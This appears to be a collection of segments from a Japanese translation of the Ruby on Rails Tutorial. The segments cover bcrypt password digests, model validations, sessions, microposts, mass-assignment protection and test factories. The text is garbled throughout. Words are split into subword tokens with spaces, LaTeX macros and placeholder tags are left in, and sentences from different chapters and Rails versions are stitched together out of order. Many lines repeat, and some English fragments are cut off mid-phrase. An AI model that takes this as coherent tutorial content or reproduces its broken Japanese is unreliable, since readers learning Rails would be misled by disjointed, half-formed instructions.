▁上のコード を実行する だけで 、 ( \ href { http :// api . rubyonrails . org / v 4 . 0.0 / classes / Active Model / V al id ation s / Helper M e th o d s . html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ ko de { password _ confirmation } という 属性 が 作成されます 。
▁ このコード には \ ko de { password _ digest } 属性 の 検証 も 含 まれ ます 。 )
▁ ここ まで 来 たら 、 テストスイート が パス する ことを確認 しましょう 。
▁この 作業 によって 、 これまで の 節 で 行 な っ てきた 実装 が 動作する ことも 実 感 できる ことでしょう 。 テストスイート が パス する だけで は 味 気 ないので 、 実際に 開発 データベースに ユーザーを 登録 することで 喜 び を 感 じ ていた だけ れば と思います 。
▁ created _ at : ▁"2013-03-11 ▁20 : 4 5 : 19 ", ▁ updated _ at : ▁"2013-03-11 ▁20 : 4 5 : 19 ",
▁ password _ digest : ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 7 6 Z g D x O W k 6 J e 9 A 0 T t n ... "
▁{0} 図 6 . 6 {/0} {1} SQLite データベース \ ko de { db / development . sqlite 3 } に 登録 された ユーザーの 行 。 \ href { http :// railstutorial . org / images / figure s / sqlite _ user _ row _ with _ password _4_0 - full . png }{( 拡大 ) }{/1}
▁=> ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 7 6 Z g D x O W k 6 J e 9 A 0 T t n 5 s K N a G T E m T 0 j U 7 . n ... "
▁また 、 最初に 無効な パスワード 、 次に 有効な パスワード を与える ことで \ ko de { authenticate } の動作 を確認する こともできます 。
▁この 章では 、 まったく 最 初 から User モデル を作成し 、 それ に \ ko de { name } 属性 と \ ko de { email } 属性を 与え 、 さまざまな パスワード 属性 も 与え 、 値を 制限 する 多くの 重要な 検証 も 追加 しました 。
▁さらに 、 与えられた パスワードを セキュア に 認 証 できるように しました 。
▁ 以前の バージョンの Rails であれば 、 このような 実装 を行う ための コードは 現在の 倍 以上 になって いた ことでしょう 。 しかし 今 では コ ン パ ク ト な ▁\ ko de { validates } メソッドと \ ko de { has _ secure _ password } メソッドの おかげで 、 ほ ん の 数 行 の コードを 書く だけで 完全な User モデル を作成 できるようになりました 。
▁次に master ブランチ に マージ バ ッ ク します 。
▁この テストでは 、\ ko de { reload } メソッドを使用して データベースから 値を 再度 読み込み 、\ ko de { e q } メソッドを使用して 同 値 である かどうかを テスト してください 。
▁self を省略した 結果を リスト \ ref { code : downcase _ b an g } に示します 。
▁Rails ▁API サイトの \ ko de { ActiveRecord :: Base } の 項 を 読み 通 し 、 どんな ことができる か を 把 握 してください 。
▁Rails ▁API サイト で \ ko de { validates } メソッド を調べ 、 どんな ことができる か 、 どんな オプション がある か を調べ てください 。
▁\ href { http :// www . r ub ul ar . com /}{ R ub ul ar } で 2 〜 3 時間 ほど 遊 んで みてください 。
▁ セキュア パスワード という 手法 では 、 各 ユーザーに パスワード と パスワード の 確認 を 入力 させ 、 それ を ▁( そのまま ではなく ) ▁ 暗号化 した もの を データベースに保存 します 。
▁ユーザーの 認 証 は 、 パスワード の 送信 、 暗号化 、 データベース 内の 暗号化 された 値 と の 比 較 という 手順 を 踏 み ます 。
▁ここで 、 生 の パスワード ではなく 、 暗号化 された パスワード 同士 を 比 較 し ていることに注目してください 。 こうすることで 、 生 の パスワード をデータベースに保存する という 危 険 な ことを し なくても ユーザーを 認 証 できます 。
▁ ハッシュ 関数 には 最新の \ href { http :// en . w ikipedia . org / wiki / B c ry p t } { bcrypt } を使用し 、 パスワードを 不 可 逆 的に 暗号化 して パスワード ハッシュ を作成します 。
▁次に 、\ ko de { password } 属性 と \ ko de { password _ confirmation } 属性 を追加し 、 パスワード が存在する ことを 要求 し 、 パスワード と パスワード の 確認 が 一致する ことを 要求 し 、 さらに \ ko de { authenticate } メソッドを使用して 、 暗号化 された パスワード と \ ko de { password _ digest } を 比 較 して ユーザーを 認 証 する という 多くの 手順 が必要です 。
▁上の 文字列 は 、 パスワード ▁(\ ko de { " foo bar " }) ▁ を 暗号化 した もの であり 、 ユーザー オブジェクトを 初期化 するのに 使用 されました 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁id = \ text tt {1} のユーザー を表示する ページ
▁id = \ text tt {1} の ユーザーを 編集 する ページ
▁id = \ text tt {1} のユーザー を更新する アクション
▁id = \ text tt {1} のユーザー を削除する アクション
▁リスト \ ref { code : hello _ root _ route } のとき
▁もちろん 、 . gitignore など を 適切に 利用 すれば 、 そう した 機 密 情報を 適切に 扱 う ことができます 。 しかし そのため には それ なり の 経験 が 必要 であり 、 慣 れ た 開発者 でも ときに 扱 い を 間 違 え てしまう こと があり え る のです 。
▁ ページ の内容 は 図 \ ref { fig : hello _ world _ first _ app } と まったく 同じです が 、 今 や それ が イン ター ネ ッ ト 上の 本番 Web ページ として 堂 々 と 公開 されている のです 。
▁$ ▁ kill ▁- 15 ▁1 22 4 1
▁$ ▁ p kill ▁- 15 ▁- f ▁ s p r ing
▁ 開発 中に 動作 が お か しく な った り プロセス が フ リ ー ズ している と 思 え たら 、 すぐ に \ text tt { p s ▁a u x } で 状態 を 確認 し 、\ text tt { kill ▁- 15 ▁< p id > } や \ text tt { p kill ▁- 15 ▁- f ▁< プロセス 名 > } で ク リ ー ン アップ しましょう 。
▁これは 、\ ko de { rails ▁ new } で 生成された コードは シ ング ル ク オ ー テ ー ション を使っています が 、\ href { https :// github . com / k er n / mini test - re port er s } { mini test レ ポ ー ター の ドキュメント } では ダ ブ ル ク オ ー テ ー ション を 使っている ことが 原 因 です 。
▁\ ko de { new } フォーム と \ ko de { edit } フォーム を パーシャル 化 する
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁リスト { p 0} で 定義されている {2} authenticated ? {/2} メソッド 内の {2} remember _ token {/2} の 引数 は 、 リスト \ ref { code : user _ model _ remember } の {2} attr _ accessor ▁: remember _ token {/2} で 定義されている ア ク セ サ と同じ では ない 点 に ご注意ください 。 引数 は 、 メソッド 内 ローカル な 変数 になっています が 、
▁ Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : un i c or n _ gemfile } は 開発環境 に 影 響 はありません 。 しかし 、 Bundler に \ ko de { Gemfile . lock } を更新し ても ら う 必要がある ので 、 いつものように 次の コマンド を 実行 しておきます 。
▁ 次の 図 \ ref { fig : fi ll ed _ in _ form } に 示す ように 、 テキスト フィールド ▁(\ ko de { type =" text "} と \ ko de { type =" email " }) ▁ では 内容 を そのまま 表示 しています が 、 パスワード フィールド ▁(\ ko de { type =" password " }) ▁ では セキュリティ上の 目的 のために 文字 が 隠 蔽 されています ▁( 図 \ ref { fig : fi ll ed _ in _ form })。
▁ これはリスト \ ref { code : base _ title _ test } で使用されていま した 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 . b e t a 4 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁ 演習 の 解 答
▁ 属性 を更新する もうひとつ の 方法は 、\ ko de { update _ attributes } を使う ものです
▁リスト \ ref { code : email _ format _ validation _ tests } と同様に 、 リスト \ ref { code : email _ format _ validation _ tests } でも エラーメッセージ を カスタマイズ して 、 どの メールアドレス で 失敗した のか すぐ に 特 定 できるように しておきます 。 ▁ include s ▁a ▁ custom ▁ error ▁ message ▁to ▁id ent if y ▁the ▁ ex a ct ▁ address ▁ ca us ing ▁ any ▁ failure .
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4 . 2 . 0 . b e t a 2 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁self を省略した 結果を リスト \ ref { code : debug g er } に示します 。
▁( � 図 \ ref { fig : signup _ failure _ 3 r d _ edit ion } の 下 部 に 見え ている の が Rails の \ emph { web ▁console } という 機能 です 。 これは rails ▁console を ブラウザ 上で 開 け るように し 、 デバッグ を し や す く するための 機能 です 。
▁リスト \ ref { code : g en er at ing _ pages } では 、 コントローラ 名を キ ャ メ ル ケース ▁( 訳 注 : ▁ 単 語 の 頭 文字 を 大文字 に して つ な ぎ 合わせ た 名前 ) ▁ で 渡 し ていることに注目してください 。 こう すると 、 StaticPages コントローラ 名を \ href { https :// en . w ikipedia . org / wiki / S n a ke _ case } { ス ネ ー ク ケース } ▁( 訳 注 : ▁ 単 語 間 に アンダースコア を加え て 繋 ぎ 合わせ た 名前 ) ▁ に した ファイル ▁\ ko de { static _ pages _ controller . rb } ▁ を 自動的に 生成 します 。
▁ 追 伸 : ▁\ ko de { rails ▁ g } は ▁\ ko de { rails ▁ generate } コマンド の 短縮 形 であり 、 Rails で サポート されている 多数の 短縮 形 の ひとつ です ▁( 表 \ ref { table : sh or t c u t s })。
▁ と に か く \ ko de { about . html . erb } を 正しい ディレクトリ に 作成 できた ので 、 リスト \ ref { code : custom _ about _ page } の とおり に コードを 入力 します 。
▁\ ko de { log _ out } メソッドを Sessions コントローラの \ ko de { destroy } アクション で も同様に 使用します ▁( リスト \ ref { code : destroy _ session })。
▁リスト { p 0} の アプリケーション コード では 、 {2} logged _ in ? {/2} が true の 場合に 限 って {2} log _ out {/2} を呼び出す ように 変更 しました 。
▁ これはリスト \ ref { code : password _ reset _ integration _ test } で使用されていま した 。
▁ これはリスト \ ref { code : branch _ raise } で使用されていま した 。
▁ これはリスト \ ref { code : rails _ routes _ root _ route } で使用されていま した 。
▁上の 最後の 手順 が 、 ユーザー ログイン のとき の 手順 と 似 ている ことにご注目ください 。 ユーザー ログイン では 、 メールアドレスを キー に して ユーザー を取り出し 、 送信された パスワード が パスワード ダイジェスト と 一致する ことを ▁(\ ko de { authenticate } メソッドで ) ▁ 確認 します ▁( リスト \ ref { code : log _ in _ success })。
▁ これはリスト \ ref { code : authenticated _ p } で使用されていま した 。
▁ これはリスト \ ref { code : log _ in _ success } で使用されていま した 。
▁このコードは リスト \ ref { code : title _ tests } で使用されていま した 。 もうひとつ 、
▁* ▁This ▁is ▁a ▁ ma n if e st ▁ file ▁that ' ll ▁ auto ma tic all y ▁ include ▁ all ▁the ▁ stylesheets
▁* ▁ available ▁in ▁this ▁ directory ▁and ▁ any ▁ sub - d ir e ct or ies .
▁* ▁ application - w id e ▁ style s ▁to ▁this ▁ file ▁and ▁the y ' ll ▁app e ar ▁ at ▁the ▁to p ▁of ▁the
▁* ▁ compile d ▁ file , ▁ b u t ▁it ' s ▁ g en er all y ▁be tt er ▁to ▁create ▁a ▁ new ▁ file ▁ per ▁ style
▁* ▁ scope .
▁* = ▁require _ self
▁* = ▁require _ tree ▁ .
▁* = ▁require _ tree ▁ .
▁* = ▁require _ self
▁User ▁ add ▁ some ▁ example s ▁to ▁( or ▁ delete )
▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec . rb
▁( No t ▁ Y e t ▁I m p le m ent ed )
▁ これはリスト \ ref { code : name _ presence _ test } で使用されていま した 。
▁( スクリーンキャスト は 、 このような 一 から の 手 作り 開発 手順 を 解 説 するのに 向 い ています 。 この 課題 を 十分 に 理解 したい 方は 「\ href { http :// www . railstutorial . org / sc re en casts } { Ruby ▁on ▁Rails ▁Tutorial ▁ sc re en casts } ▁( 英語 )」 を参照してください )。
▁上のコード を実行する だけで 、 ( \ href { http :// api . rubyonrails . org / v 4.1 . 5 / classes / Active Model / V al id ation s / Helper M e th o d s . html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ ko de { password _ confirmation } という 属性 が 作成されます 。
▁end
▁self を省略した 結果を リスト \ ref { code : microposts _ create _ action _ with _ feed } に示します 。
▁{0}{1} 第 2 章 {/1}{/0} の 演習 で 少し 触 れ ましたが 、 name 属性 の 存 在 を 検 査 する方法 は 、 リスト { p 2 } に示した とおり 、 {3} validates {/3} メソッド に {3} presence : ▁true {/3} という 引数 を与えて 使う ことです 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api . rubyonrails . org / v 4.1 . 4 / classes / ActiveRecord / Callbacks . html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を 読んで みてください 。
▁上のコード を実行する だけで 、 ( \ href { http :// api . rubyonrails . org / v 4.1 . 4 / classes / Active Model / V al id ation s / Helper M e th o d s . html # method - i - validates _ confirmation _ of } { Rails ▁API } に記載されている ように ) ▁\ ko de { password _ confirmation } という 属性 が 作成されます 。
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ ko de { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁ 静的なページ の作成 は 、\ ko de { 第 {1} 2 {/1} 章 } で scaffold 生成 に 使用 した {2} generate {/2} スクリプト で 、 コントローラ を生成する こと から 始 め ます 。
▁self を省略した 結果を リスト \ ref { code : adding _ the _ about _ page } に示します 。
▁ 表 \ ref { table : static _ pages } の 各 タイトル について 簡単な テストを 書き ます ▁( リスト \ ref { code : about _ page _ content _ spec })。 この テスト で 使用している \ ko de { assert _ select } メソッド では 、 特定の HTML タグ が存在する かどうか をテストします ▁( この種の アサーション メソッドは その 名 から 「 セ レ ク タ 」 と呼ばれる こともあります )
▁リスト \ ref { code : html _ structure } のとき
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触 れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記述 した Micropost データモデル を作成し 、 User モデルと \ ko de { has _ many } および \ ko de { belongs _ to } メソッドを使って 関連付け を行い 、 さらに 、 結果を 処理 し 表示 するために 必要な フォーム と その 部品 を作成します ▁(\ ref { sec : microposts _ with _ images } で 画像 の アップロード も 実装します )。
▁\ href { http ://0.0.0.0:3000/ sessions / new }{/ sessions / new } フォーム を 送信 すると 図 \ ref { fig : initial _ failed _ signin _ rails _ 3 } のようになります 。
▁もちろん 、 シ ン プ ル になった ということ は 完成 度 が \ emph { さらに } 高 ま った ということ の 証 し であり 、 退 化 した わけではありません 。 {1}{2} 第 2 章 {/2}{/1} で scaffold に 頼 り き り だ った 頃 から ここに 至 る まで は 長 い 道 の り で した が 、 今 では scaffold が 生成 する ような 複雑な コードは ほとんど 不 要 に なりました 。
▁ 図 \ ref { fig : initial _ failed _ signin _ rails _ 3 } に 表示 されている デバッグ情報 にご注目ください 。 \ ref { sec : signin _ form } の 終わり でも 簡単に 触 れ ましたが 、\ ko de { params } ハッシュ では 、 以下のように \ ko de { session } キー の下に メールアドレス と パスワード があります 。
▁ フラッシュメッセージ は Web サイトの レイアウト に 表示される ▁( リスト \ ref { code : layout _ flash }) ▁ ので 、\ ko de { flash [: d an g er ]} で 設定 した メッセージ は自動的に 表示 されます 。 Bootstrap ▁ CSS の おかげで 適切な スタイル も 与え られます ▁( 図 \ ref { fig : failed _ signin _ flash })。
▁次に 、 図 \ ref { fig : failed _ signin _ flash _ 3 r d _ edit ion } と 図 \ ref { fig : flash _ persisten ce _ 3 r d _ edit ion } の 手順 を テストコード で 再 現 する必要があります 。
▁ 置き換え の 終わっ た 正しい アプリケーション コードをリスト \ ref { code : correct _ signin _ failure } に示します 。
▁作成した コードをリスト \ ref { code : sign _ in _ success } に示します
▁ これはリスト \ ref { code : sessions _ helper _ include } で使用されていま した 。
▁ これはリスト \ ref { code : signed _ in _ p } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : layout _ signin _ sign out _ links } に示します 。
▁このコードは リスト \ ref { code : layout _ signin _ sign out _ links } で使用されていま した 。 もうひとつ 、
▁self を省略した 結果を リスト \ ref { code : signin _ up on _ signup } に示します 。
▁作成した コードをリスト \ ref { code : signin _ after _ signup _ test } に示します
▁ 変更 の 結果を リスト \ ref { code : jquery _ file _ test } に示します 。
▁ ちなみに 、 リスト \ ref { code : jquery _ file _ test } のような コード では 大 き すぎる ファイルの アップロード を 完全に は 阻 止 できない 、 という 点 を 覚 え て おいてください 。
▁ 手順 を追加した テストを リスト \ ref { code : user _ sign out _ test } に示します 。
▁\ ref { sec : sign ing _ in } では 、 Rails の \ ko de { session } メソッドを使用して ユーザー ID を保存し ましたが 、 この 情報 は ブラウザを閉じ ると 消 え てしまいます 。
▁\ ref { sec : a _ working _ sign _ in _ method } で 解 説 した ように 、\ ko de { session } メソッドで 保存 した 情報 は自動的に 安全 が 保 た れ ます が 、\ ko de { cookies } メソッド に保存 する 情報 は 残念ながら その ように は な って いません 。
▁作成した コードをリスト \ ref { code : image _ upload er _ re s i z ing } に示します
▁ Git バージョン管理 を 使用している 方は 、 次 に進む前に 変更を マージ して コミット すること を 忘れ ない で ください 。
▁ この時点で Heroku に アプリ を プッシュ しても よいでしょう 。
▁ ステータスフィード の パーシャル は 以下のコード を使う という 点 で 、 フィード ア イ テ ム の パーシャル に 表示される フィード ア イ テ ム と 異なります 。
▁ここでは 、 フィード ア イ テ ム として \ ko de { : collection } パラメータ ー を渡して いる ので 、\ ko de { render } は コレクション の 各 ア イ テ ム を表示する ために 与えられた パーシャル ▁( この場合は \ ko de { ’ feed _ item ’ }) を使用 してくれます 。
▁( 以前の 表示 では 、\ ko de { render ▁ ’ shared / micropost ’ } のように \ ko de { : partial } パラメータ ー を省略 していました が 、\ ko de { : collection } パラメータ ー がある場合 はこの 記 法 では 正常に動作し ません 。 )
▁ これはリスト \ ref { code : feed _ item _ partial } で使用されていま した 。
▁ 単 一 の フィード ア イ テ ム 用の パーシャル
▁ セッション 機能 ▁(\ ref { sec : sessions _ and _ failed _ signin }) ▁ を使用して 、 アカウント の 有効化 という 作業 を 「 リソース 」 として モデル 化 する ことにします 。 アカウント の 有効化 リソース は Active ▁Record の モデルと はこの 際 関係 ないので 、 両者 を 関連付け ること は しません 。
▁ これはリスト \ ref { code : prev ent ing _ un activat ed _ signin s } で使用されていま した 。
▁リスト \ ref { code : signup _ with _ account _ activation _ test } の \ ko de { as sign s } メソッドは 本チュートリアル 初 登 場 です 。 {3} 第 {1} 8 {/1} 章 {/3} の 演習 ▁(\ ref { sec : sign _ in _ out _ exercises }) ▁ で 説明したように 、\ ko de { as sign s } メソッドを使用すると 、 対応する アクション 内に ある インスタンス変数 にアクセス できるようになります 。
▁ これはリスト \ ref { code : test _ helper _ sign _ in } で使用されていま した 。
▁( リスト \ ref { code : sign _ in _ password _ reset s } と 図 \ ref { fig : forgot _ password _ link } 参 照 )
▁ 新しい パスワード再設定 フォーム は リスト \ ref { code : signin _ form _ redux } と 多くの 共通 点 があります が 、 重要な 違 い として 、\ ko de { form _ for } の 呼び出し で使用する リソース と URL が 異 な っている こと と 、 パスワード 属性 が 省略 されている ことが 挙 げ られます 。
▁ これはリスト \ ref { code : user _ relationships _ association } で使用されていま した 。
▁作成した コードをリスト \ ref { code : relationship _ belongs _ to } に示します
▁\ href { http :// www . railstutorial . org / sc re en casts }{\ emph { Ruby ▁on ▁Rails チュートリアル } スクリーンキャスト } 。 本書 に合わせて 、 完 全 版 の スクリーンキャスト を 用 意 して あります 。
▁\ href { http :// p e e p code . com /}{ P e e p Co de } と \ href { http :// m b s y . co / 6 V Q 8 l } { Co de ▁S ch o ol } 。 P e e p Co de の スクリーンキャスト と Co de ▁S ch o ol の イン タ ラ ク テ ィ ブ コース は 品 質 が 高 い ことで 知 られ ており 、 強 く お勧め いた します 。
▁この 追加 の 節 は 、\ href { http :// www . railstutorial . org /}{ Ruby ▁on ▁Rails チュートリアル スクリーンキャスト シ リ ー ズ } ▁( 原 著者 の 主 催 する 有 料 スクリーンキャスト : ▁ 英語 のみ ) ▁ で使用する テスト 用 設定 について解説します 。
▁self を省略した 結果を リスト \ ref { code : sessions _ helper _ authenticate } に示します 。
▁\ ko de { signed _ in _ user } メソッドを セッション ヘルパー に 移動 する 。
▁ コードが 重複 しない よう 、\ ko de { signed _ in _ user } を Users コントローラ から も 削除 しておきましょう 。
▁ も し 仮 に \ ko de { index } アクション を追加し 、 サインイン していない ユーザー でも アクセス 可能 に したい場合は 、 以下のように index アクション 以外の アクション を明示的に指定 する必要があります 。
▁ マイクロポスト 作成 フォーム は 、 サインイン している 特定の ユーザーの コンテキスト で のみ 機能 する ので 、 この節 の 一 つの 目 標 は 、 ユーザーの サインイン の 状態 に応じて 、 ホ ー ム ページの 表示 を変更する ことです 。
▁リスト \ ref { code : errors _ partial } のとき
▁self を省略した 結果を リスト \ ref { code : add _ micropost _ d if f er ent _ own er } に示します 。
▁ テストにパス する 必要 のある 、 リスト { p 0} の {2} update {/2} アクション は 、 リスト \ ref { code : signin _ up on _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁ 図 \ ref { fig : signin _ page _ protected _ mockup _ bootstrap } のように 転 送 させる 仕組み を 実装 したい とき は 、 Users コントローラ の中で \ emph { before フィルター } を使います 。
▁ これはリスト \ ref { code : user _ sign out _ test } で使用されていま した 。
▁リスト \ ref { code : test _ helper _ sign _ in } のとき
▁self を省略した 結果を リスト \ ref { code : edit _ tests _ signed _ in } に示します 。
▁ これはリスト \ ref { code : edit _ tests _ signed _ in } で使用されていま した 。
▁ 変更 後 の データモデル は 図 \ ref { fig : user _ model _ admin _ 3 r d _ edit ion } のようになります 。
▁\ ref { sec : requir ing _ signed _ in _ users } と \ ref { sec : requir ing _ the _ right _ user } と同じ ように 、 今回は before フィルター を使って \ ko de { destroy } アクション への アクセス を 制 御 します 。
▁\ ref { sec : requir ing _ signed _ in _ users } で 経験 し てきた ように 、 Users コントローラ をテストする ために 、 アクション 単 位 で アクセス 制 御 をテストします 。
▁{0} 図 10 .2{/0} {1} micropost ▁ と ▁ user {/1} 間 の \ ko de { belongs _ to } リレーションシップ
▁これ によって 、 カ レ ン ト ユーザーに 所 属 する マイクロポスト だけ が自動的に 見つか ること が 保 証 されます 。
▁ これはリスト \ ref { code : signin _ form _ html } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : user _ signin _ test _ valid _ information } に示します 。
▁self を省略した 結果を リスト \ ref { code : sign _ in _ with _ remember } に示します 。
▁self を省略した 結果を リスト \ ref { code : sign _ out _ with _ for get } に示します 。
▁ これはリスト \ ref { code : remember _ me _ check box } で使用されていま した 。
▁このコードは リスト \ ref { code : signin _ create _ user _ instance } で使用されていま した 。 もうひとつ 、
▁ これはリスト \ ref { code : activation _ token _ test } で使用されていま した 。
▁作成した コードをリスト \ ref { code : user _ model _ activation _ code } に示します
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ 拡 張 した マイクロポストの データモデル を 、 図 \ ref { fig : micropost _ model _ image } に示します 。
▁ これはリスト \ ref { code : add _ remember _ token _ to _ users } で使用されていま した 。
▁Active ▁Record で サポート される コールバック の 種類 の詳細については 、 Rails ▁ G u id es の 「\ href { http :// guides . rubyonrails . org / active _ record _ c all b ack s . html } { コールバック について } ▁( 英語 )」 を参照してください 。
▁ これはリスト \ ref { code : sign _ in _ f un c tion } で使用されていま した 。
▁ これはリスト \ ref { code : generated _ user _ fixtures } で使用されていま した 。
▁ これはリスト \ ref { code : user _ signin _ test _ valid _ information } で使用されていま した 。
▁self を省略した 結果を リスト \ ref { code : test _ helper _ sign _ in } に示します 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ この節 のコード で 、 Micropost モデルと インターフェイス が 完成 しました 。 すべての テストが パス するはずです 。
▁\ ko de { microposts } テーブル を追加する ために データモデル を変更 した ので 、 本番 データベース を マ イ グ レ ート する必要があります 。
▁ ここ まで に 数 多くの 題 材 を 取り上げ てきました ので 、 今 や アプリケーションを 拡 張 する方法 は 山 ほど あります 。
▁ 以下 は 、 その 中 の ご く わずか に 過 ぎ ません 。
▁作成した コードをリスト \ ref { code : remember _ digest _ sh o ul d _ not _ b e _ blank } に示します
▁ x ▁= ▁ x ▁+ ▁1
▁ユーザー を削除する アクション
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触 れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記述 した Micropost データモデル を作成し 、 User モデルと \ ko de { has _ many } および \ ko de { belongs _ to } メソッドを使って 関連付け を行い 、 さらに 、 結果を 処理 し 表示 するために 必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します )。
▁ Git ▁ を バージョン管理 に 使っている 場合は 、 いつものように トピックブランチ を作成 しておきましょう 。
▁self を省略した 結果を リスト \ ref { code : initial _ micropost _ spec } に示します 。
▁ 最初の Micropost ▁ spec 。
▁ Micropost ▁ マイグレーション を実行し 、 テスト データベース を 準備 することで 、 これらの テストを パス させる ことができます 。
▁ テストにパス する ことを確認 してみましょう 。
▁ テストにパス した として も 、 コード の中に ある 以下の コメント に 気 付 いた 方 も いる と思います 。
▁上の コメント は 、\ ko de { before } ▁ ブロック のコード が 慣 用 的な 意味 で 正しく ないこと を 指 摘 しています 。
▁このコードは 動 きます が 、 Rails の 流 儀 に 合 って いません 。
▁その 理由 を 考え て みてください 。
▁この 作業 には ある程度 の リファクタリング が 必要な ので 、 テスト を作成して バグ の 再 発 を キャッチ する ようにします 。
▁このコードは マイクロポスト が 有効 であり 、 かつ \ ko de { user _ id } 属性 が存在し ている ことを テスト しています 。
▁これで 、 以下のコード が 誤 っている 理由 を見つけ るため の 準備 が 整 い ました 。
▁is ▁ w r on g .
▁ 問題 と な っている のは 、 デフォルト ▁( Rails ▁3.2 . 3 の場合 ) ▁ で Micropost モデルの \ emph { すべて } の 属性 が アクセス 可能 になっている ことです 。
▁たとえば 、 悪意のある ユーザ が マイクロポストの \ ko de { user _ id } 属性を 改 変 し 、 別の ユーザ に マイクロポストを 関連 づ け る 事 も 可能です 。
▁つまり 、\ ko de { user _ id } は \ ko de { attr _ access i b le } リスト から 削除 される べ き であり 、 また そう する ことにより 上 記 のコードは テスト に 失敗 します 。
▁ マイクロポスト に 関連付けられた ユーザー オブジェクト を返す 。
▁ユーザーの マイクロポストの 配列 を返す 。
▁ マイクロポスト を作成する ▁(\ ko de { user _ id ▁= ▁ user . id })。
▁ マイクロポスト を作成する ▁( 失敗した場合 は 例外を発生 する )。
▁ 新しい Micropost オブジェクト を返す ▁(\ ko de { user _ id ▁= ▁ user . id })。
▁この パターン は 、 user ▁ オブジェクトの 関連付けを \ emph { 経 由 して } マイクロポスト を作成する 標準的な 方法 です 。
▁ 新 規 の マイクロポスト が この 方法で 作成される 場合 、\ ko de { user _ id } は \ emph { 自動 的 } に 正しい 値 に 設定 されます 。
▁ マイクロポストを ユーザ と 関連付け て 構 築 でき ても 、\ ko de { user _ id } にアクセス でき てしまう という セキュリティ上の 問題 は 解決 されません 。
▁self を省略した 結果を リスト \ ref { code : attr _ access i b le _ user _ id _ test } に示します 。
▁\ ko de { user _ id } が アクセス 不 能 である ことを確認する テスト 。
▁この テストは 、 空 では ない \ ko de { user _ id } を使用して \ ko de { Micropost . new } を 呼 ぶ と 、 ma s s ▁as sign m ent ▁ security ▁ error 例外 が発生する ことを確認 しています 。
▁self を省略した 結果を リスト \ ref { code : application _ w h it e list } に示します 。
▁Rails が invalid ▁ ma s s ▁as sign m ent エラー を 発生 する ように する 設定 。
▁self を省略した 結果を リスト \ ref { code : micropost _ access i b le _ attribute } に示します 。
▁\ ko de { content } 属性を ▁( そして \ ko de { content } 属性 \ emph { のみ } を ) ▁ アクセス 可能 にする 。
▁このメソッドは 、\ ko de { it } と \ ko de { it s } メソッドを 以下のように 使う ことで テスト できます 。
▁ これはリスト \ ref { code : micropost _ belongs _ to _ user _ spec } で使用されていま した 。
▁ マイクロポストの ユーザ と の 関連付け のテスト 。
▁ユーザーの \ ko de { microposts } 属性 に対するテスト 。
▁このコードは リスト \ ref { code : micropost _ belongs _ to _ user _ spec } で使用されていま した 。 もうひとつ 、
▁ テストにパス すること も 確認 しておきましょう 。
▁この 章では 、\ emph { 順序 } と \ emph { 依 存 関係 } を マイクロポスト に追加 し 、\ ko de { user . microposts } メソッドが 実際に マイクロポストの 配列 を返す こと をテストします 。
▁User モデルの テスト のために いくつかの マイクロポスト を作成 しておく必要があります ので 、 この時点で マイクロポスト を生成する ファクトリー を作成 しておきましょう 。
▁その ためには 、 Factory ▁Girl に 関連付け を作成する 方法 を 知 っ ておく 必要があります 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ マイクロポスト 作成 用の 新しい ファクトリー を含む 、 完全な Factory ファイル 。
▁ここでは 、 以下のように マイクロポスト 用の ファクトリー の 定義 に user を含め る だけで 、 マイクロポスト に 関連付け られ る ユーザーの ことが Factory ▁Girl に 伝 わ ります 。
▁ 次の 節 でも お 見 せ します が 、 これ によって 、 以下のように マイクロポスト 用の ファクトリー を 定義 できるようになります 。
▁この 順序 をテストする ために 、 次のように マイクロポストを いくつか 作成 しておきます 。
▁ Factory ▁Girl を使用すると 、 Active ▁Record が アクセス を 許可 しない ような \ ko de { created _ at } 属性 も 手動で 設定 できる ので 大 変 便利です
▁(\ ko de { created _ at } や \ ko de { updated _ at } など は 通常の カラム と 異なる ▁“ マ ジ ッ ク ” カラム であり 、 これらの 作成 タイムスタンプ や 更新 タイムスタンプ は自動的に 設定 され てしまう ため 、 明示的に 値を 設定 しても 上 書き され てしまう ことを思い出してください )。
▁ これはリスト \ ref { code : micropost _ order ing _ test } で使用されていま した 。
▁ このコード では \ ko de { let } メソッド の代わりに \ ko de { let ! } ▁( “ let ▁ バ ン ” と 読み ます ) ▁ メソッド を使っています 。 その 理由 は 、\ ko de { let } 変数 は \ emph { la z y } 、 つまり 参 照 された ときに は じ め て 初期化 される ためです 。
